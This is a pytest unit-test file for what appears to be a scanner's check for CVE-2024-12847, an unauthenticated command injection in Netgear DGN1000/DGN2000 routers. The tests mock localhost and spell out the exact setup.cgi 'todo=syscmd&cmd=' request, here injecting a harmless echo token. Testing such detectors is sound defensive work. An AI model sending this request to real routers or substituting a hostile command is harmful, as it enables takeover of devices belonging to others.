"""Unit tests for CVE-2024-12847"""

import random
import pytest
import requests_mock as req_mock
from requests import exceptions as requests_exceptions
from urllib.parse import quote_plus

from agent import definitions
from agent.exploits import cve_2024_12847


def testNetgearDGNCommandInjection_whenStatus200_accept(
    monkeypatch: pytest.MonkeyPatch, requests_mock: req_mock.mocker.Mocker
) -> None:
    """accept() should return True when status code is 200."""
    # Patch random.choices for deterministic token (unused in accept)
    monkeypatch.setattr(random, "choices", lambda seq, k: list("ANYTOKEN"))

    # Mock setup.cgi GET to return HTTP 200
    requests_mock.get(
        "http://localhost:80/setup.cgi",
        status_code=200,
    )

    exploit_instance = cve_2024_12847.NetgearDGNCommandInjectionExploit()
    target = definitions.Target("http", "localhost", 80)

    assert exploit_instance.accept(target) is True


def testNetgearDGNCommandInjection_whenNot200_rejectAccept(
    monkeypatch: pytest.MonkeyPatch, requests_mock: req_mock.mocker.Mocker
) -> None:
    """accept() should return False when status code is not 200."""
    monkeypatch.setattr(random, "choices", lambda seq, k: list("ANYTOKEN"))

    requests_mock.get(
        "http://localhost:80/setup.cgi",
        status_code=500,
    )

    exploit_instance = cve_2024_12847.NetgearDGNCommandInjectionExploit()
    target = definitions.Target("http", "localhost", 80)

    assert exploit_instance.accept(target) is False


def testNetgearDGNCommandInjection_whenVulnerable_reportFinding(
    monkeypatch: pytest.MonkeyPatch, requests_mock: req_mock.mocker.Mocker
) -> None:
    """Test case: when target is vulnerable to command injection."""
    # Patch random.choices for deterministic token
    fixed_token = "TESTTOKEN1234"
    monkeypatch.setattr(random, "choices", lambda seq, k: list(fixed_token))

    # Mock accept GET to return status 200
    requests_mock.get(
        "http://localhost:80/setup.cgi",
        status_code=200,
    )

    # Prepare raw and encoded safe command
    raw_cmd = f"echo+{fixed_token}"
    encoded_cmd = quote_plus(raw_cmd)

    # Mock syscmd GET with encoded command param
    requests_mock.get(
        f"http://localhost:80/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd={encoded_cmd}&curpath=%2F&currentsetting.htm=1",
        text=f"...{fixed_token}...",
        status_code=200,
    )

    exploit_instance = cve_2024_12847.NetgearDGNCommandInjectionExploit()
    target = definitions.Target("http", "localhost", 80)

    vulnerabilities = exploit_instance.check(target)

    assert len(vulnerabilities) == 1
    vulnerability = vulnerabilities[0]
    assert vulnerability.entry.title == "Netgear DGN1000/DGN2000 Unauthenticated RCE"
    assert vulnerability.entry.risk_rating == "CRITICAL"
    assert vulnerability.vulnerability_location is not None
    assert vulnerability.dna is not None


def testNetgearDGNCommandInjection_whenNoToken_reportNothing(
    monkeypatch: pytest.MonkeyPatch, requests_mock: req_mock.mocker.Mocker
) -> None:
    """Test case: when no command execution token is returned."""
    fixed_token = "OTHERTOKEN000"
    monkeypatch.setattr(random, "choices", lambda seq, k: list(fixed_token))

    # Mock accept GET
    requests_mock.get(
        "http://localhost:80/setup.cgi",
        status_code=200,
    )

    # Prepare raw and encoded safe command
    raw_cmd = f"echo+{fixed_token}"
    encoded_cmd = quote_plus(raw_cmd)

    # Mock syscmd GET with no token
    requests_mock.get(
        f"http://localhost:80/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd={encoded_cmd}&curpath=%2F&currentsetting.htm=1",
        text="no token here",
        status_code=200,
    )

    exploit_instance = cve_2024_12847.NetgearDGNCommandInjectionExploit()
    target = definitions.Target("http", "localhost", 80)

    vulnerabilities = exploit_instance.check(target)

    assert len(vulnerabilities) == 0


def testNetgearDGNCommandInjection_requestException_handlingErrorLogged(
    monkeypatch: pytest.MonkeyPatch, requests_mock: req_mock.mocker.Mocker
) -> None:
    """Test case: handle RequestException during accept() and check()."""
    monkeypatch.setattr(random, "choices", lambda seq, k: list("FAILEDTOKEN"))

    # Mock setup.cgi GET to raise exception
    requests_mock.get(
        "http://localhost:80/setup.cgi",
        exc=requests_exceptions.RequestException("Simulated connection error"),
    )

    exploit_instance = cve_2024_12847.NetgearDGNCommandInjectionExploit()
    target = definitions.Target("http", "localhost", 80)

    vulnerabilities = exploit_instance.check(target)

    assert exploit_instance.accept(target) is False
    assert len(vulnerabilities) == 0
